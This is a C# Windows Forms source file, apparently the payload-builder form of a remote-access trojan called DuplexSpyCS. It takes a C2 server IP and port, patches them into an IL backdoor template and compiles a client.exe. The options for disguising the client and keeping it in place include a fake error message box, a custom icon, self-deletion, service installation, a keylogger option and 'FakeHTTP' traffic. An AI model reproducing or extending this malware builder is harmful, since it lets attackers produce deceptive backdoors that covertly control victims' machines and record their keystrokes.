using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace DuplexSpyCS
{
    public partial class frmBuild : Form
    {
        private IniManager ini_manager = C2.ini_manager;
        private Image exe_icon;

        private BuildConfig buildConfig;
        private MsgBoxConfig msgboxConfig;

        public frmBuild()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Append "information" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsInfo(string msg)
        {
            richTextBox1.SelectionColor = Color.Blue;
            richTextBox1.AppendText("[*] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Append "OK" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsOK(string msg)
        {
            richTextBox1.SelectionColor = Color.Lime;
            richTextBox1.AppendText("[+] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Append "Error" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsErr(string msg)
        {
            richTextBox1.SelectionColor = Color.LightCoral;
            richTextBox1.AppendText("[-] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Validate build configuration.
        /// </summary>
        /// <param name="config"></param>
        /// <returns></returns>
        bool ValidateBuildConfig(BuildConfig config)
        {
            try
            {
                if (string.IsNullOrEmpty(config.szIP))
                    throw new Exception("Server IP is null or empty.");
                else
                    IPAddress.Parse(config.szIP); //throw exception if parse failed.

                if (config.dwPort <= 1024 || config.dwPort >= 65536)
                    throw new Exception("Invalid port value.");

                if (config.dwTimeout < 0)
                    throw new Exception("Invalid timeout value.");

                if (config.dwRetry < 0)
                    throw new Exception("Invalid retry value.");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "BuildConfig structure data error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                logsErr(ex.Message);

                return false;
            }
        }

        /// <summary>
        /// Compile client exe from il assembly.
        /// </summary>
        /// <param name="output_file">Output exe file.</param>
        /// <param name="srcContent">IL assembly code.</param>
        /// <returns></returns>
        bool CompileFromIL(string output_file, string srcContent)
        {
            /* How it work:
             * Write srcContent(Payload) into temp file,
             * compile the il assembly code using ilasm: ilasm tmp.il /debug /output:output_file.
             * Delete temp file.
             * Change output exe file icon(If specified).
             */

            //TODO
            try
            {
                string ilasm_file = "ilasm.exe";
                string tmp_file = Path.Combine(new string[]
                {
                    Application.StartupPath,
                    "Payload",
                    Path.GetTempFileName(),
                });

                File.WriteAllText(tmp_file, srcContent);

                Process proc = new Process();
                proc.StartInfo = new ProcessStartInfo()
                {
                    FileName = ilasm_file,
                    Arguments = $"\"{tmp_file}\" /debug /output:\"{output_file}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                proc.Start();

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                return false;
            }
        }

        /// <summary>
        /// Build client exe file.
        /// </summary>
        /// <param name="filePath"></param>
        void Build(string filePath)
        {
            tabControl1.SelectedIndex = tabControl1.TabPages.Count - 1; //Select Last Page

            buildConfig = new BuildConfig()
            {
                /* Necessary Data */
                szIP = textBox1.Text, //Server IP address
                dwPort = (int)numericUpDown1.Value, //Server listening port.
                dwTimeout = (int)numericUpDown2.Value, //Client connection timeout(ms).
                dwRetry = (int)numericUpDown3.Value, //Client reconnect time interval(ms).

                /* Optional Data */
                bEncryptIP = checkBox1.Checked, //Enable ip encryption.

                bMsgBox = checkBox2.Checked, //Enable message when client run(fake error message).
                msgboxConfig = this.msgboxConfig, //Message box configuration.

                clntLang = (ClientLanguage)comboBox1.SelectedIndex, //Client programming language.
                clntType = (ClientType)comboBox7.SelectedIndex, //Client type(merged, small, etc... in next version).
            };

            //Validate configuration, stop build client exe file if validation is failed.
            if (!ValidateBuildConfig(buildConfig))
                return;

            //Client source file path.
            string clnt_file = Path.Combine(
                new string[] 
                {
                    Application.StartupPath, 
                    "Payload", 
                    buildConfig.clntType.ToString(), 
                    $"{buildConfig.clntType}.il",
                }
            );

            if (File.Exists(clnt_file))
            {
                string szPayload = File.ReadAllText(clnt_file);
                if (string.IsNullOrEmpty(szPayload))
                {
                    MessageBox.Show("File content is null or empty:\n" + clnt_file, "IsNullOrEmpty()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                //Set value
                szPayload = (szPayload

                    //General
                    .Replace("[IP]", buildConfig.szIP)
                    .Replace("[PORT]", buildConfig.dwPort.ToString())
                    .Replace("[TIMEOUT]", buildConfig.dwTimeout.ToString())
                    .Replace("[RETRY]", buildConfig.dwRetry.ToString())

                    //Msgbox
                    .Replace("[MSGBOX_ENABLE]", buildConfig.bMsgBox ? "true" : "false")
                    .Replace("[MSGBOX_CAPTION]", buildConfig.msgboxConfig.caption)
                    .Replace("[MSGBOX_CONTEXT]", buildConfig.msgboxConfig.context)
                    .Replace("[MSGBOX_BTN]", buildConfig.msgboxConfig.button.ToString())
                    .Replace("[MSGBOX_ICON]", buildConfig.msgboxConfig.icon.ToString())
                );

                if (CompileFromIL(filePath, szPayload))
                {
                    //Compile successfully.
                    MessageBox.Show("Build client successfully:\n" + filePath, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    logsOK("Build client successfully: " + filePath);
                }
                else
                {
                    //Compile failed.
                    MessageBox.Show("Build client failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    logsErr("Build client failed.");
                }
            }
            else
            {
                MessageBox.Show("File not found:\n" + clnt_file, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Test server listen port.
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        void ConnTest(string ip, int port)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SendTimeout = (int)numericUpDown2.Value;
                socket.Connect(ip, port);
                socket.Close();
                MessageBox.Show("Connect successfully", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        void setup()
        {
            try
            {
                if (ini_manager == null)
                {
                    MessageBox.Show("ini_manager is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Close();
                    return;
                }
                else
                {
                    string ReadIni(string section, string key)
                    {
                        return ini_manager.Read(section, key);
                    }

                    //General
                    string szIP = "127.0.0.1"; //Server IP address.
                    int dwPort = int.Parse(ReadIni("General", "listen_port")); //Server listening port.

                    int dwTimeout = int.Parse(ReadIni("Build", "timeout")); //ms
                    int dwRetry = int.Parse(ReadIni("Build", "retry")); //ms

                    textBox1.Text = szIP; //Server IP address.
                    numericUpDown1.Value = dwPort; //Server listening port.

                    numericUpDown2.Value = dwTimeout; //Client connection timeout(ms).
                    numericUpDown3.Value = dwRetry;  //Client retry interval(ms).

                    //Install
                    string szName = ReadIni("Build", "name"); //Service name.
                    string szInfo = ReadIni("Build", "info"); //Service information.
                    int bDictionary = int.Parse(ReadIni("Build", "bDictionary")); //Copy to specified directory.

                    textBox3.Text = szName;
                    textBox4.Text = szInfo;
                    checkBox5.Checked = bDictionary == 0;

                    //Others
                    comboBox1.SelectedIndex = 0; //Language
                    comboBox5.SelectedIndex = 0; //Data: RAW, FakeHTTP
                    comboBox4.SelectedIndex = 0; //Keylogger
                    comboBox7.SelectedIndex = 0; //Backdoor type.

                    checkBox2.Checked = int.Parse(ReadIni("Build", "use_msgbox")) == 1; //Enable MessageBox
                    checkBox3.Checked = int.Parse(ReadIni("Build", "use_icon")) == 1; //Set exe Icon
                    checkBox4.Checked = int.Parse(ReadIni("Build", "delete")) == 1; //Enable self-delete
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }
        }

        private void frmBuild_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Test Connection
        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(() => ConnTest(textBox1.Text, (int)numericUpDown1.Value)).Start();
        }

        //Build
        private void button3_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "client.exe";
            sfd.Filter = "Executable File(*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    Build(sfd.FileName);
                }
                catch (Exception ex)
                {
                    logsErr(ex.Message);
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            frmBuildMsgbox f = new frmBuildMsgbox();
            f.Text = @$"MsgBox@Build";
            f.ShowDialog();
            MsgBoxConfig config = f.config;
            f.Dispose();

            msgboxConfig = config;
            logsInfo("User set msgbox.");
        }

        //Choose Icon
        private void button6_Click(object sender, EventArgs e)
        {
            frmBuildIconPicker f = new frmBuildIconPicker();
            f.ShowDialog();

            exe_icon = f.exe_icon;
            f.Dispose();

            if (exe_icon != null)
            {
                pictureBox1.Image = exe_icon;
                logsInfo("User set icon.");
            }
        }

        //Help - Encrypt IP
        private void button2_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Build\\EncryptIP").Show();
        }
        //Help
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Build\\Help").Show();
        }
    }
}
